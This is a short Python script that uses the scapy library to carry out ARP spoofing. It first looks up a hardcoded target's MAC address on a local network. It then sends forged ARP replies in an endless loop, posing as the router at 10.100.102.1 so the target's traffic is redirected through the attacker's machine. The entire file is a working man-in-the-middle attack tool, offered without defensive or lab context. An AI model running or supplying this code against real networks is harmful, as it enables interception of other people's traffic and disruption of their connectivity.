import scapy.all as s
s.conf.use_pcap = True
Target_ip="10.100.102.6"
def Get_target_mac_adress(my_ip, Target_ip, my_mac):
    arp_request = s.Ether(dst="ff:ff:ff:ff:ff:ff", src= my_mac)/s.ARP(op = 1, psrc = my_ip, pdst = Target_ip, hwsrc= my_mac)
    s.sendp(arp_request)
    res = s.srp(arp_request)
    print(res)
    result, unanswered = res
    Target_mac = result[0][1].hwsrc
    return Target_mac

def send_arp_spoof(my_ip, router_ip, Target_ip, My_mac, Target_mac):
    arp_spoof = s.Ether(dst= Target_mac, src= My_mac)/s.ARP(op=2, pdst= Target_ip, psrc= router_ip, hwsrc= My_mac, hwdst= Target_mac)
    while True:
        s.sendp(arp_spoof)

Target_mac = Get_target_mac_adress(my_ip= "10.100.102.34", Target_ip="10.100.102.6", my_mac="fc:b2:14:77:44:66")
send_arp_spoof("10.100.102.34", "10.100.102.1",Target_ip, "fc:b2:14:77:44:66", Target_mac)